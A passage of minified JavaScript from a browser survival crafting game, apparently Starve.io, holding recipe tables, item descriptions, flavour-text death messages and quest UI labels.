                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.AMETHYST_ARROW,
                    id2: Be.AMETHYST_ARROW,
                    time: 1 / 15,
                    t: ae
                }, {
                    r: [[Be.REIDITE, 200], [Be.BLUE_CORD, 10], [Be.KRAKEN_SKIN, 1], [Be.AMETHYST_BOW, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.REIDITE_BOW,
                    id2: Be.REIDITE_BOW,
                    time: 1 / 45,
                    t: ae
                }, {
                    r: [[Be.REIDITE, 10], [Be.VULTURE_FEATHER, 1], [Be.FLAME, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.REIDITE_ARROW,
                    id2: Be.REIDITE_ARROW,
                    time: 1 / 15,
                    t: ae
                }, {
                    r: [[Be.EMERALD, 200], [Be.BLUE_CORD, 10], [Be.DRAGON_ORB, 1], [Be.REIDITE_BOW, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.DRAGON_BOW,
                    id2: Be.DRAGON_BOW,
                    time: .02,
                    t: ae
                }, {
                    r: [[Be.EMERALD, 10], [Be.SANDWORM_JUICE, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.DRAGON_ARROW,
                    id2: Be.DRAGON_ARROW,
                    time: .05,
                    t: ae
                }, {
                    r: [[Be.WOOD, 100]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.WOOD_SHIELD,
                    id2: Be.WOOD_SHIELD,
                    time: .04,
                    t: ae
                }, {
                    r: [[Be.WOOD_SHIELD, 1], [Be.STONE, 100], [Be.WOOD, 50]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.STONE_SHIELD,
                    id2: Be.STONE_SHIELD,
                    time: .025,
                    t: ae
                }, {
                    r: [[Be.STONE_SHIELD, 1], [Be.GOLD, 50], [Be.STONE, 50], [Be.WOOD, 50]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.GOLD_SHIELD,
                    id2: Be.GOLD_SHIELD,
                    time: .02,
                    t: ae
                }, {
                    r: [[Be.GOLD_SHIELD, 1], [Be.DIAMOND, 50], [Be.GOLD, 50], [Be.STONE, 50]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.DIAMOND_SHIELD,
                    id2: Be.DIAMOND_SHIELD,
                    time: 1 / 70,
                    t: ae
                }, {
                    r: [[Be.DIAMOND_SHIELD, 1], [Be.AMETHYST, 50], [Be.DIAMOND, 50], [Be.GOLD, 50]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.AMETHYST_SHIELD,
                    id2: Be.AMETHYST_SHIELD,
                    time: 1 / 90,
                    t: ae
                }, {
                    r: [[Be.AMETHYST_SHIELD, 1], [Be.REIDITE, 50], [Be.AMETHYST, 50], [Be.DIAMOND, 50]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.REIDITE_SHIELD,
                    id2: Be.REIDITE_SHIELD,
                    time: 1 / 120,
                    t: ae
                }, {
                    r: [[Be.GEMME_GREEN, 1], [Be.GOLD, 200]],
                    w: 1,
                    f: 1,
                    o: 1,
                    e: 0,
                    id: u.CROWN_GREEN,
                    id2: Be.CROWN_GREEN,
                    time: 1 / 60,
                    t: se
                }, {
                    r: [[Be.GEMME_ORANGE, 1], [Be.GOLD, 200]],
                    w: 1,
                    f: 1,
                    o: 1,
                    e: 0,
                    id: u.CROWN_ORANGE,
                    id2: Be.CROWN_ORANGE,
                    time: 1 / 60,
                    t: se
                }, {
                    r: [[Be.GEMME_BLUE, 1], [Be.GOLD, 200], [Be.DRAGON_HEART, 1]],
                    w: 1,
                    f: 1,
                    o: 1,
                    e: 0,
                    id: u.CROWN_BLUE,
                    id2: Be.CROWN_BLUE,
                    time: 1 / 60,
                    t: se
                }, {
                    r: [[Be.FUR_WOLF, 10], [Be.FUR, 5], [Be.CORD, 6]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.HOOD,
                    id2: Be.HOOD,
                    time: .1,
                    t: se
                }, {
                    r: [[Be.FUR, 3], [Be.CORD, 2]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.PEASANT,
                    id2: Be.PEASANT,
                    time: .1,
                    t: se
                }, {
                    r: [[Be.HOOD, 1], [Be.SPECIAL_FUR_2, 1], [Be.FUR_WINTER, 15], [Be.BLUE_CORD, 5], [Be.PENGUIN_FEATHER, 8]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.WINTER_HOOD,
                    id2: Be.WINTER_HOOD,
                    time: 1 / 60,
                    t: se
                }, {
                    r: [[Be.PEASANT, 1], [Be.SPECIAL_FUR, 1], [Be.FUR_WINTER, 10], [Be.BLUE_CORD, 5], [Be.PENGUIN_FEATHER, 8]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.WINTER_PEASANT,
                    id2: Be.WINTER_PEASANT,
                    time: 1 / 60,
                    t: se
                }, {
                    r: [[Be.BUCKET_EMPTY, 1]],
                    w: 0,
                    f: 0,
                    o: 1,
                    e: 0,
                    id: u.BUCKET_FULL,
                    id2: Be.BUCKET_FULL,
                    time: .2,
                    t: oe
                }, {
                    r: [[Be.WOOD, 20], [Be.CORD, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.BUCKET_EMPTY,
                    id2: Be.BUCKET_EMPTY,
                    time: .2,
                    t: oe
                }, {
                    r: [[Be.STONE, 100], [Be.GROUND, 30]],
                    w: 1,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.WELL,
                    id2: Be.WELL,
                    time: .1,
                    t: Ee
                }, {
                    r: [[Be.WOOD, 20]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.SIGN,
                    id2: Be.SIGN,
                    time: .2,
                    t: Ee
                }, {
                    r: [[Be.WOOD, 100], [Be.STONE, 50], [Be.FUR, 5], [Be.FUR_WOLF, 5], [Be.CORD, 6]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.BED,
                    id2: Be.BED,
                    time: .05,
                    t: Ee
                }, {
                    r: [[Be.WOOD, 250], [Be.BLUE_CORD, 10], [Be.FUR_WINTER, 2], [Be.SCALES, 2]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.BOAT,
                    id2: Be.BOAT,
                    time: .02,
                    t: Ee
                }, {
                    r: [[Be.WOOD, 250], [Be.CORD, 10], [Be.FUR_WINTER, 2], [Be.PENGUIN_FEATHER, 8]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.SLED,
                    id2: Be.SLED,
                    time: .02,
                    t: Ee
                }, {
                    r: [[Be.CORD, 10], [Be.FUR_WOLF, 6], [Be.FUR, 4], [Be.SAND, 50]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.SADDLE,
                    id2: Be.SADDLE,
                    time: .05,
                    t: Ee
                }, {
                    r: [[Be.WOOD, 250], [Be.CORD, 10], [Be.PAPER, 10], [Be.HAWK_FEATHER, 8]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.PLANE,
                    id2: Be.PLANE,
                    time: .02,
                    t: Ee
                }]
                , e = 300;
            TEXT = {
                YOU_CANNOT_JOIN: e++,
                KICKED: e++,
                KEY_ALREADY: e++,
                KEY_WRONG: e++,
                OLD_VERSION: e++,
                NO_MORE_RESOURCES: e++,
                SURVIVED_1DAY: e++,
                SURVIVED: e++,
                DAYS: e++,
                DEAD_SAD: e++,
                SPAM_ME: e++,
                SPAM_ME2: e++,
                EMPTY: e++,
                INV_FULL: e++,
                DEAD: e++,
                WRONG_TOOL: e++,
                JOIN_TEAM: e++,
                YOU_DEAD: e++,
                JOINED_TEAM: e++,
                TEAM_DESTROYED: e++,
                LEFT_TEAM: e++,
                LEFT_TEAM2: e++,
                TOKEN: e++,
                CHOOSE: e++,
                PLAYERS: e++,
                TOTAL_PLAYERS: e++,
                TOTAL_MODE: e++,
                COMMING_SOON: e++,
                BACK_TO_THE_GAME: e++,
                TWITTER: e++,
                FACEBOOK: e++,
                KIT_NEXT: e++,
                POINTS: e++,
                SCORE: e++,
                KILL: e++,
                DAYS_SURVIVED: e++,
                MODE_FREE: e++,
                MODE_GRID: e++,
                NEW_VERSION: e++,
                WRONG_PASSWORD: e++,
                TEMPEST_OFF: e++,
                TEMPEST_ON: e++,
                BLIZZARD_OFF: e++,
                BLIZZARD_ON: +e
            };
            function Ie() {
                We[Be.EXTRACTOR_MACHINE_STONE] = ["Stone Extractor", "Can produce stone with wood", "It takes 10 seconds to drill Stone", "Durability: 2000"],
                    We[Be.EXTRACTOR_MACHINE_GOLD] = ["Gold Extractor", "Can produce gold with wood", "It takes 10 seconds to drill Gold", "Durability: 2000"],
                    We[Be.EXTRACTOR_MACHINE_DIAMOND] = ["Diamond Extractor", "Can produce diamond with wood", "It takes 10 seconds to drill Diamond", "Durability: 2000"],
                    We[Be.EXTRACTOR_MACHINE_AMETHYST] = ["Amethyst Extractor", "Can produce amethyst with wood", "It takes 10 seconds to drill Amethyst", "Durability: 2000"],
                    We[Be.EXTRACTOR_MACHINE_REIDITE] = ["Reidite Extractor", "Can produce reidite with wood", "It takes 10 seconds to drill Reidite", "Durability: 2000"],
                    We[Be.REIDITE_SHIELD] = ["Reidite Shield", "A must for the pros of the getaway", "You can not attack when you use it", "Damage: 6", "Players Defense: 6"],
                    We[Be.AMETHYST_SHIELD] = ["Amethyst Shield", "Because you know how to run away in style", "You can not attack when you use it", "Damage: 5", "Players Defense: 5"],
                    We[Be.DIAMOND_SHIELD] = ["Diamond Shield", "Run or attack, you've obviously made your choice.", "You can not attack when you use it", "Damage: 4", "Players Defense: 4"],
                    We[Be.GOLD_SHIELD] = ["Gold Shield", "When it's golden, it's always better.", "You can not attack when you use it", "Damage: 3", "Players Defense: 3"],
                    We[Be.STONE_SHIELD] = ["Stone Shield", "Protects you a bit more", "You can not attack when you use it", "Damage: 2", "Players Defense: 2"],
                    We[Be.WOOD_SHIELD] = ["Wood Shield", "Protects you a bit", "You can not attack when you use it", "Damage: 1", "Players Defense: 1"],
                    We[Be.MACHETE] = ["Machete", "You gather more from mob boxes", "Useless to attack mobs", "Damage against Players: 5"],
                    We[Be.WOOD_TOWER] = ["Tower", "Allows you to shoot over walls with a bow", "Does not allow to pass through roofs"],
                    We[Be.DRAGON_ARROW] = ["Dragon Arrow", "Must be used with a Dragon Bow", "Damage: 45", "Mobs Damage: 1200", "Building Damage: 45"],
                    We[Be.DRAGON_BOW] = ["Dragon Bow", "Also called the One-Shot-Monster", "Requiers arrows to be used"],
                    We[Be.REIDITE_ARROW] = ["Reidite Arrow", "Must be used with a Reidite or a Dragon Bow", "Damage: 40", "Mobs Damage: 900", "Building Damage: 40"],
                    We[Be.REIDITE_BOW] = ["Reidite Bow", "Makes the most terrifying monster cry.", "Requiers any arrows, except dragon arrows, to be used"],
                    We[Be.AMETHYST_ARROW] = ["Amethyst Arrow", "Must be used with Amethyst, Reidite or Dragon Bow", "Damage: 35", "Mobs Damage: 600", "Building Damage: 35"],
                    We[Be.AMETHYST_BOW] = ["Amethyst Bow", "It's super efficient!", "Requiers any arrows, except dragon and reidite arrows, to be used"],
                    We[Be.DIAMOND_ARROW] = ["Diamond Arrow", "Must be used with Diamond, Amethyst, Reidite or Dragon Bow", "Damage: 30", "Mobs Damage: 300", "Building Damage: 30"],
                    We[Be.DIAMOND_BOW] = ["Diamond Bow", "Like a Robin Wood who would keep the diamonds", "Requiers wood, stone, gold or diamond arrows to be used"],
                    We[Be.GOLD_ARROW] = ["Gold Arrow", "Must be used with a Bow, except a wooden and stone one", "Damage: 25", "Mobs Damage: 200", "Building Damage: 25"],
                    We[Be.GOLD_BOW] = ["Gold Bow", "When it's golden, it's better.", "Requiers wood, stone or gold arrows to be used"],
                    We[Be.STONE_ARROW] = ["Stone Arrow", "Must be used with a Bow, except a wooden one", "Damage: 20", "Mobs Damage: 100", "Building Damage: 20"],
                    We[Be.STONE_BOW] = ["Stone Bow", "Like Robin Wood", "Requiers wood and stone arrows to be used"],
                    We[Be.WOOD_ARROW] = ["Wood Arrow", "Must be used with any bow", "Damage: 15", "Mobs Damage: 20", "Building Damage: 15"],
                    We[Be.WOOD_BOW] = ["Wood Bow", "A little bow that does not do many damages.", "Requiers wood arrows to be used"],
                    We[Be.EMERALD_MACHINE] = ["Emerald Machine", "Allows to automatically generate score points.", "Be careful, you can only build one.", "Once placed your soul is connected to the machine, if the machine is destroyed, you will die.", "The machine can't be build in the sea", "You earn more points in the desert, than in the lava, than in winter, than in the forest."],
                    We[Be.FUR_BOAR] = ["Boar fur", "Hakuna Matata, well, he can no longer say it"],
                    We[Be.FUR_MAMMOTH] = ["Mammoth fur", "Soft and warm. Perfect for a hat."],
                    We[Be.VULTURE_FEATHER] = ["Vulture Feather", "From a deadly vulture"],
                    We[Be.EMERALD] = ["Emerald", "How many golden breads can you get from it?"],
                    We[Be.SANDWORM_JUICE] = ["Sand Worm Juice", "I don't want to know how you got this."],
                    We[Be.TURBAN1] = ["Turban", "Useful to survive in the desert."],
                    We[Be.TURBAN2] = ["Ninja outfit", "Essential to survive in the desert"],
                    We[Be.PILOT_HELMET] = ["Pilot Hat", "Take off and land with flying objects much faster."],
                    We[Be.PILOT_GLASSES] = ["Pilot Glasses"],
                    We[Be.MOUNT_BOAR] = ["Tamed Boar", "Fast on lands and slow on water."],
                    We[Be.BABY_MAMMOTH] = ["Tamed Baby Mammoth", "Fast on lands and slow on water."],
                    We[Be.CRAB_BOSS] = ["Tamed Crab Boss", "Fast on lands and water, and slow on winter.", "Gives a +10 damage bonus of the Crab Spear", "when holding a Crab Helmet"],
                    We[Be.BABY_DRAGON] = ["Tamed Baby Dragon", "You can fly with it.", "Faster than a hawk", "When you are flying,", " you can only hit people who are flying too"],
                    We[Be.BABY_LAVA] = ["Tamed Baby Lava Dragon", "You can fly with it.", "Faster than a baby dragon", "When you are flying,", " you can only hit people who are flying too"],
                    We[Be.HAWK] = ["Tamed Hawk", "You can fly with it.", "When you are flying,", " you can only hit people who are flying too"],
                    We[Be.SADDLE] = ["Saddle", "Hit a boar with it to tame it."],
                    We[Be.WITCH] = ["Witch Hat", "You're a wizard Starvy!"],
                    We[Be.NIMBUS] = ["Nimbus 2000", "That's not just a broomstick, Starvy, it's a Nimbus 2000!", "Only works with the witch hat."],
                    We[Be.WAND1] = ["Wand of life", "Soon we must all choose between what is right and what is easy.", "You need the witch hat and firefly to cast spell"],
                    We[Be.WAND2] = ["Death Wand", "The wand of He-Who-Must-Not-Be-Named... Lapa...", "You need the witch hat and firefly to cast spell"],
                    We[Be.FIREFLY] = ["Firefly", "They make a cute little squeak.", "However, you must tear off his wings to make magical projectiles for use with magic wands."],
                    We[Be.PIRATE_HAT] = ["Pirate hat", "You are faster with it in a boat", "Warm outside water and in winter"],
                    We[Be.SLED] = ["Sled", "You are faster with it in the snow"],
                    We[Be.BOAT] = ["Boat", "You are faster with it in the water"],
                    We[Be.PLANE] = ["Plane", "Fly in the forest, ocean and winter", "Can't fly in desert or lava biome", "When you are flying,", " you can only hit people who are flying too"],
                    We[Be.HAMMER_REIDITE] = ["Reidite Hammer", "Useful to destroy buildings", "Damage: 6", "Building Damage: 60"],
                    We[Be.PENGUIN_FEATHER] = ["Penguin Feather", "From a deadly cute penguin."],
                    We[Be.HAWK_FEATHER] = ["Hawk Feather", "From a deadly hawk."],
                    We[Be.CACTUS] = ["Cactus", "Food : 20", "Water : 10"],
                    We[Be.ALOE_VERA] = ["Aloe Vera", "Allows you to heal a little", "Heal : 30"],
                    We[Be.ALOE_VERA_SEED] = ["Aloe Vera Seed", "Grows into Aloe Vera"],
                    We[Be.WATERMELON] = ["Watermelon", "Like a melon, but with water", "Food : 15", "Water : 8"],
                    We[Be.WATERMELON_SEED] = ["Watermelon Seed", "Grows into Watermelon", "Birth: 4min", "Growth: 180s", "Need water: 3min 20s", "Durability: 400", "Lifetime: 8 days"],
                    We[Be.REIDITE_DOOR] = ["Reidite Door", "Noboby can destroy it. Except very reckless", "Damage: 5", "On-Hit Damage: 1", "Durability: 4000"],
                    We[Be.REIDITE_WALL] = ["Reidite Wall", "Better wall in StarveLand", "Durability: 4000"],
                    We[Be.REIDITE_SPIKE] = ["Reidite Spike", "It hurts", "Damage: 60", "On-Hit Damage: 5", "Durability: 3000"],
                    We[Be.REIDITE_DOOR_SPIKE] = ["Reidite Door Spike", "Painful and useful at the same time", "Damage: 35", "On-Hit Damage: 4", "Durability: 2000"],
                    We[Be.PICK_REIDITE] = ["Reidite Pickaxe", "Can also harvest reidite, better look!", "Damage: 6", "Building Damage: 1"],
                    We[Be.WOOD_DOOR_SPIKE] = ["Wood Door Spike", "Can be opened or closed by you or your friends", "Damage: 5", "On-Hit Damage: 1", "Durability: 100"],
                    We[Be.STONE_DOOR_SPIKE] = ["Stone Door Spike", "A stronger door is more serious", "Damage: 10", "On-Hit Damage: 2", "Durability: 200"],
                    We[Be.GOLD_DOOR_SPIKE] = ["Gold Door Spike", 'Are you rebuilding the "el dorado?"', "Damage: 15", "On-Hit Damage: 2", "Durability: 400"],
                    We[Be.DIAMOND_DOOR_SPIKE] = ["Diamond Door Spike", "For a shining house", "Damage: 25", "On-Hit Damage: 3", "Durability: 800"],
                    We[Be.AMETHYST_DOOR_SPIKE] = ["Amethyst Door Spike", "Is your house a locked safe?", "Damage: 30", "On-Hit Damage: 3", "Durability: 1600"],
                    We[Be.CARROT] = ["Carrot", "Eat it or sell it in exchange for Tomato Seed or Diamond", "Food : 20"],
                    We[Be.TOMATO] = ["Tomato", "Eat it or sell it in exchange for Thornbush Seed or Amethyst", "Food : 16"],
                    We[Be.CARROT_SEED] = ["Carrot Seed", "Grows into Carrot", "Birth: 4min", "Growth: 30s", "Need water: 1min 40s", "Durability: 700", "Lifetime: 8 days"],
                    We[Be.TOMATO_SEED] = ["Tomato Seed", "Grows into Tomato", "Birth: 4min", "Growth: 30s", "Need water: 1min 40s", "Durability: 700", "Lifetime: 8 days"],
                    We[Be.PITCHFORK] = ["Pitchfork", "Perfect for gathering"],
                    We[Be.PITCHFORK2] = ["Golden Pitchfork", "Essential for a real farmer."],
                    We[Be.PITCHFORK_PART] = ["Pitchfork Part", "Shaped by the gods. You'll never be hungry again."],
                    We[Be.EGG0] = ["Easter Egg", "Eat it or sell it in exchange for wood or stone", "Food : 12"],
                    We[Be.EGG1] = ["Easter Egg", "Eat it or sell it in exchange for gold", "Food : 25"],
                    We[Be.EGG2] = ["Easter Egg", "Eat it or sell it in exchange for diamond", "Food : 50"],
                    We[Be.EGG3] = ["Easter Egg", "Eat it or sell it in exchange for amethyst", "Food : 75"],
                    We[Be.EGG4] = ["Easter Egg", "Eat it or sell it in exchange for reidite", "Food : 100"],
                    We[Be.LAVA_CUBE] = ["Lava Cube", "You feel an immense power emanating from this cube"],
                    We[Be.LAVA_ORB] = ["Lava Orb", "You feel an immense power emanating from this orb"],
                    We[Be.LAVA_SWORD] = ["Lava Sword", "Don't be too mean with that.", "Damage: 33", "Building Damage: 11"],
                    We[Be.LAVA_SPEAR] = ["Lava Spear", "Doing good or doing evil", "Damage: 24", "Building Damage: 8"],
                    We[Be.LAVA_HEART] = ["Lava Heart", "You can feel a strange force.", "A huge power emanates from it.", "We must not find the secret."],
                    We[Be.LAVA_HELMET] = ["Lava Helmet", "You will conquer the world", "Players Defense: 9", "Animals Defense: 30"],
                    We[Be.REIDITE_SPEAR] = ["Reidite Spear", "Really useful against Lava Monsters", "Damage: 22", "Building Damage: 7"],
                    We[Be.REIDITE_SWORD] = ["Reidite Sword", "Really useful against Lava Monsters", "Damage: 30", "Building Damage: 10"],
                    We[Be.FLAME] = ["Flame", "It's hot!"],
                    We[Be.DIAMOND_PROTECTION] = ["Diamond Protection", "You can survive longer in lava", "Cools down in lava biome", "Players Defense: 2, Animals Defense: 8"],
                    We[Be.AMETHYST_PROTECTION] = ["Amethyst Protection", "You can survive longer in lava", "Cools down in lava biome", "Players Defense: 5, Animals Defense: 13"],
                    We[Be.REIDITE_PROTECTION] = ["Reidite Protection", "You can survive longer in lava", "Cools down in lava biome", "Players Defense: 6, Animals Defense: 19"],
                    We[Be.REIDITE] = ["Reidite", "The ultimate ore"],
                    We[Be.DRAGON_CUBE] = ["Dragon Cube", "You feel a great power emanating from this cube"],
                    n[22] = ["This crab, though frightening in nature, pinched your fingertips so hard that you had a heart attack."],
                    n[23] = ["The heat makes you suffocate, you can see your skin fall apart. You're charred. The grilled marshmallow has never been so tasty."],
                    n[24] = ["Your vital organs melt inside, fortunately the toxic gases that escape from the lava make you faint and you do not feel the excruciating pain of death."],
                    n[25] = ["The Will-O'-The-Wisp devoured you from the inside with its fiery flames."],
                    n[26] = ["Oh my God, you died in indescribable pain. Even Lapa turned his head not to see this massacre."],
                    n[27] = ['You were trampled by that boar. From now on, your new nickname is "the doormat".'],
                    n[28] = ['With a force of 3300 newtons, the shock wave from the closing of the crab king\'s claw made you explode your heart from the inside. In addition, the crab has eaten you by sharing your remains with its other small crabs. All dance in joy around your corpse by performing a singular dance called the "crab rave"'],
                    n[29] = ["Even if it is a baby, under the heat of the flames of this cute dragon, you become a delicious dish."],
                    n[30] = ["Under its cute fake looks, the lava baby dismembers you so quickly that you don't have your life flashes before your eyes."],
                    n[31] = ["The hawk slashed both your eyes out. Terrified, you try to escape by crawling and screaming in pain. Unfortunately the hawk catches you and takes you to distant skies that we already know will never see you again."],
                    n[32] = ["Believing you saw an oasis, you dived into this tree that seemed to you to be full of juicy fruit. Unfortunately, these shiny fruits were in fact horribly painful thorns. Now stuck to the cactus, exhausted by the desert, you have fainted forever."],
                    n[33] = ["That vulture had been spying on you for a long time. He was waiting for a moment of fragility from you. Once cornered by this harassing desert, barely able to breathe, the vulture twisted on you and in a flash ripped out your last hope. At your last breath, you could still see the vulture plunge his head into what was left of your body to enjoy your entrails."],
                    n[34] = ["Out of nowhere, the sand worm devours you in a terrifying howl. But why did Lapa bring such a despicable monster to life?"],
                    n[35] = ["Exhausted by so much heat. You would like to cry, but the sand quickly dries your tears. You suffocate, sand enters your mouth, the thumping sound of the sandstorm will be the last thing you will hear... Next time, use a turban or protect yourself under a roof"],
                    n[36] = ["You feel weak, your vision becomes blurry, you can feel the darkness invading your body. Your soul flies away and leaves behind a lifeless body. Your emerald machine has been destroyed."],
                    n[37] = ['You hear "Avada Kedavra!" before you turn to ashes.'],
                    n[38] = ["You died crushed by an angry baby mammoth."],
                    n[39] = ["You were skewered by a mammoth. In the violence of the animal's charge, your heart was left hanging on the tip of the tusk. You could still see your heart beating in the open air before losing your life crushed by the mammoth's feet for good. Notice that under the pressure of the crushing your eyes have been exorbed and that the penguins use the frozen eyes of the starvers as a balloon to distract themselves."],
                    n[40] = ["The blizzard storm is so intense that your frostbite causes necrosis of all your limbs. Next time protect yourself with a roof or with warmer clothes."],
                    We[Be.CRAB_STICK] = ["Crab sticks", "Oh, yeah? Is there crab in the crab sticks?", "Food: 20"],
                    We[TEXT.TEMPEST_ON] = "A sandstorm is approaching in a few seconds.",
                    We[TEXT.TEMPEST_OFF] = "The sandstorm will soon stop.",
                    We[TEXT.BLIZZARD_ON] = "A blizzard is approaching in a few seconds.",
                    We[TEXT.BLIZZARD_OFF] = "The blizzard will soon stop.",
                    We[TEXT.BACK_TO_THE_GAME] = " BACK TO THE GAME",
                    We[TEXT.TWITTER] = " Share on Twitter",
                    We[TEXT.FACEBOOK] = " Share on Facebook",
                    We[TEXT.KIT_NEXT] = "You can buy items on the shop in the next game with your points",
                    We[TEXT.POINTS] = "points",
                    We[TEXT.SCORE] = "Score",
                    We[TEXT.KILL] = "Kill",
                    We[TEXT.DAYS_SURVIVED] = "Days survived",
                    We[TEXT.MODE_FREE] = "Building method: Free. Press G to change",
                    We[TEXT.MODE_GRID] = "Building method: Grid. Press G to change",
                    We[Be.CRAB_LOOT] = ["Crab Claw", "Crab claws can also be eaten", "Food: 10"],
                    We[Be.CRAB_SPEAR] = ["Crab Spear", "Allow you to calm crabs, and heal them", "Gives a +10 damages bonus when holding it with", "a Crab Helmet on a Crab King", "Damage: 14", "Building Damage: 4"],
                    We[Be.CROWN_CRAB] = ["Crab Helmet", "You are the king of crabs!", "Crabs follow you", "They can't hit you and you can't hit them", "Players Defense: 5", "Animals Defense: 19"],
                    We[Be.BED] = ["Bed", "Relax in this confortable bed", "You are less cold, less thirsty, and less hungry", "You will be cured faster", "Durability: 400"],
                    document.getElementById("typequest").innerHTML = "Chrono Quests",
                    document.getElementById("timeremainingquest").innerHTML = "Time Remaining",
                    document.getElementById("constraintquest").innerHTML = " Constraints",
                    document.getElementById("claim_rewards").innerHTML = " Claim rewards",
                    document.getElementById("rewardquest").innerHTML = " Reward",
                    document.getElementById("killdragon_1").innerHTML = " Collect 1 dragon heart inside the cave",
                    document.getElementById("amethyst_2").innerHTML = " Gather 1 amethyst",
                    document.getElementById("survive20min_3").innerHTML = "Survive without losing life",
                    document.getElementById("treasure_chest_4").innerHTML = " Open 5 treasure chests",
                    document.getElementById("dont_hit_5").innerHTML = " Be peaceful",
                    document.getElementById("bread_6").innerHTML = "100 bread in winter, alone, without come back",
                    document.getElementById("winter_7").innerHTML = " After 1 day, survive in winter";
                for (var e = 0; e < 7; e++)
                    document.getElementById("claim_reward_" + e).innerHTML = "CLAIM REWARD!";
                document.getElementById("quit_chronoquest").innerHTML = " QUIT",
                    We[Be.HAND] = ["Hand"],
                    We[Be.GROUND] = ["Dirt", "Dirty!"],
                    We[Be.SAND] = ["Sand", "I got it in my eyes!"],
                    We[Be.WOOD] = ["Wood", "You can't get enough of it!"],
                    We[Be.STONE] = ["Stone", "Also called a rock"],
                    We[Be.GOLD] = ["Gold", "Be generous, give it to others"],
                    We[Be.DIAMOND] = ["Diamond", "What will you make with it?"],
                    We[Be.AMETHYST] = ["Amethyst", "It's Mauve like Lapa"],
                    We[Be.FLOUR] = ["Flour", "Used in cooking"],
                    We[Be.COOKIE] = ["Cookie", "A sumptuous grandmother's cookie", "Food: 50"],
                    We[Be.CAKE] = ["A cake", "Dream cake for the gourmets", "Food: 100"],
                    We[Be.MEAT] = ["Raw meat", "You can cook it with a fire", "Causes food poisoning: 10", "Food: 15"],
                    We[Be.COOKED_MEAT] = ["Cooked meat", "A rare steak, please", "Food: 35"],
                    We[Be.FOODFISH] = ["Raw fish", "I think it's still alive", "Causes food poisoning: 10", "Food: 18"],
                    We[Be.FOODFISH_COOKED] = ["Cooked fish", "With lemon it's perfect", "Food: 35"],
                    We[Be.BREAD] = ["Bread", "An excellent French bread", "It's the currency used in the market", "Food: 15"],
                    We[Be.SANDWICH] = ["Sandwich", "Tastes like Krabby Patty", "Food: 100"],
                    We[Be.CANDY] = ["Candies", "Only for children!", "Food: 20"],
                    We[Be.SUGAR_CAN] = ["Sugar cane", "Taste it, it's delicious", "Food: 100"],
                    We[Be.GARLAND] = ["Garland", "Perfect decoration for roofs"],
                    We[Be.SEED] = ["Berries Seed", "Grows into Berry", "Birth: 2min", "Growth: 55s", "Need water: 3min 20s", "Durability: 700", "Lifetime: 8 days"],
                    We[Be.PLANT] = ["Berry", "Berry tasty!", "Food: 10"],
                    We[Be.WHEAT_SEED] = ["Wheat Seed", "Grows into Wheat", "Birth: 2min", "Growth: 16s", "Need water: 2min", "Durability: 700", "Lifetime: 8 days"],
                    We[Be.WILD_WHEAT] = ["Wild Wheat", "Turns into Flour when placed in Windmill"],
                    We[Be.PUMPKIN_SEED] = ["Pumpkin Seed", "Grows into pumpkin", "Birth: 2min 40s", "Growth: 2min", "Need water: 2min", "Durability: 700", "Lifetime: 8 days"],
                    We[Be.PUMPKIN] = ["Pumpkin", "It reminds me of Halloween", "Food: 30"],
                    We[Be.GARLIC_SEED] = ["Garlic Seed", "Very dangerous for vampires", "Damage: 20", "Birth: 4min", "Growth: 1min 10s", "Need water: 1min 40s", "Durability: 700", "Lifetime: 8 days"],
                    We[Be.GARLIC] = ["Garlic", "Reduces cold", "Food: 14", "Effect: 1"],
                    We[Be.THORNBUSH_SEED] = ["Thorn bush Seed", "Can damage your enemies", "Damage: 20", "Birth: 4min", "Growth: 15s", "Need water: 3min", "Durability: 1000", "Lifetime: 8 days"],
                    We[Be.THORNBUSH] = ["Thorn bush", "It stings!"],
                    We[Be.PLOT] = ["Plot", "Seriously, use it", "With this GMO fertilizer your plants", "will growth really faster and need less water", "Durability: 2000"],
                    We[Be.ICE] = ["Ice", "Useful for making cakes and water"],
                    We[Be.SPANNER] = ["Wrench", "To repair doors, walls and spike", "Damage: 2"],
                    We[Be.FUR_WOLF] = ["Wolf Fur", "Puppy? But where is Puppy?!"],
                    We[Be.FUR] = ["Rabbit Fur", "That rabbit was so cute..."],
                    We[Be.SPECIAL_FUR] = ["Pure Fur", "You're a bread factory"],
                    We[Be.SPECIAL_FUR_2] = ["Dark Fur", "You get ready to do something wrong"],
                    We[Be.FUR_WINTER] = ["Winter Fur", "These animals just wanted a hug..."],
                    We[Be.SCALES] = ["Scales", "It smells like fish!"],
                    We[Be.KRAKEN_SKIN] = ["Kraken Skin", "Weren't you too scared?"],
                    We[Be.FIRE] = ["Firecamp", "Warm you up!", "Durability: 150", "Lifetime: 2min"],
                    We[Be.BIG_FIRE] = ["Big Firecamp", "Warm you up more time!", "Durability: 400", "Lifetime: 6min"],
                    We[Be.WORKBENCH] = ["Workbench", "Very useful to craft all kinds of objects"],
                    We[Be.CORD] = ["Cord", "Used in crafting Hats and Bag"],
